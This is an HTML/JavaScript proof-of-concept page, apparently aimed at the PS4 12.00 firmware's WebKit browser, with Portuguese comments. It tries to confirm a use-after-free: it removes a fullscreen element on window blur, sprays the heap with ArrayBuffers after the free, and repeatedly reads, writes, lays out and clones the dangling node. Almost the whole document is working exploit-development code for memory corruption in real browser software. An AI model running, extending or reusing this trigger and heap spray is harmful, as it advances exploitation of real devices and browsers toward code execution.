
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Confirmation (Clean)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF Confirmation (No DOM Noise)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP PRESSURE (leve, sem poluir DOM)
function heapPressure(){
    let tmp = [];
    for(let i=0;i<20000;i++){
        tmp.push(new ArrayBuffer(0x1000));
    }
}

// ==========================
// FULLSCREEN TARGET (SEM innerHTML!)
function setupFullscreen(){

    let fsTarget = document.createElement("div");

    // 🔒 SEM innerHTML → evita TextNode falso
    fsTarget.textContent = "X";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 🔬 DANGLING POINTER TEST
function probe(fsTarget){

    log("---- PROBE ----");

    try {

        // 🔹 Estado estrutural
        log("[CHECK] isConnected = " + fsTarget.isConnected);
        log("[CHECK] parent = " + fsTarget.parentNode);
        log("[CHECK] nodeType = " + fsTarget.nodeType);

        // 🔹 Acesso DOM
        try {
            let v = fsTarget.textContent;
            log("[CHECK] textContent OK = " + v);
        } catch(e) {
            log("[UAF] textContent crash");
        }

        // 🔹 Escrita
        try {
            fsTarget.textContent = "A";
            log("[CHECK] write OK");
        } catch(e) {
            log("[UAF] write crash");
        }

        // 🔹 Layout (muito importante)
        try {
            let r = fsTarget.getBoundingClientRect();
            log("[CHECK] layout OK = " + r.width);
        } catch(e) {
            log("[UAF] layout crash");
        }

        // 🔹 Clone (acessa estrutura interna)
        try {
            let c = fsTarget.cloneNode(true);
            log("[CHECK] clone OK");
        } catch(e) {
            log("[UAF] clone crash");
        }

    } catch(e){
        log("[UAF] acesso geral crash");
    }
}

// ==========================
// TRIGGER (INALTERADO)
function trigger(fsTarget){

    log("[*] Trigger");

    try {

        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    } catch(e){
        log("[ERRO trigger]");
    }

    // 🔥 pressão de heap pós-free
    setTimeout(heapPressure, 0);
    setTimeout(heapPressure, 50);
    setTimeout(heapPressure, 100);

    // 🔬 probes repetidos (importante)
    setTimeout(()=>probe(fsTarget), 10);
    setTimeout(()=>probe(fsTarget), 50);
    setTimeout(()=>probe(fsTarget), 100);
    setTimeout(()=>probe(fsTarget), 200);

    // dump final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ timing original
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN
function runTest(){

    log("[*] Iniciando teste");

    let fsTarget = setupFullscreen();

    window.onblur = function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
